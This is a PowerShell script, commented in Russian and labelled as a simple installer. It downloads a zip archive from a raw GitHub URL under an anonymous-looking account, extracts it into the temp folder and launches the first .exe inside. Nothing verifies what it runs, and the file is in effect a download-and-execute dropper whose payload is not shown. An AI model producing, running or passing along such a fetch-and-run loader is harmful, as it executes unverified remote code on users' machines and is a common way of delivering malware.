# =============================================
# Самый простой Installer
# =============================================

$Url = "https://raw.githubusercontent.com/v25888656-maker/check_install/main/check.zip"

Write-Host "[+] Скачиваем архив..." -ForegroundColor Cyan

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath  = "$env:TEMP\check_extracted"

# Скачивание с таймаутом и прогрессом
try {
    Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing -TimeoutSec 30
    Write-Host "[+] Скачано успешно" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка скачивания: $_" -ForegroundColor Red
    pause
    exit
}

Write-Host "[+] Распаковываем..." -ForegroundColor Cyan
New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null

try {
    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force
    Write-Host "[+] Распаковано успешно" -ForegroundColor Green
} catch {
    Write-Host "[-] Ошибка распаковки" -ForegroundColor Red
    pause
    explorer $ExtractPath
    exit
}

# Запуск .exe
$Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($Exe) {
    Write-Host "[+] Запускаем $($Exe.Name) ..." -ForegroundColor Green
    Start-Process $Exe.FullName
} else {
    Write-Host "[-] .exe не найден" -ForegroundColor Yellow
    explorer $ExtractPath
}

Write-Host "[+] Готово!" -ForegroundColor Green
pause
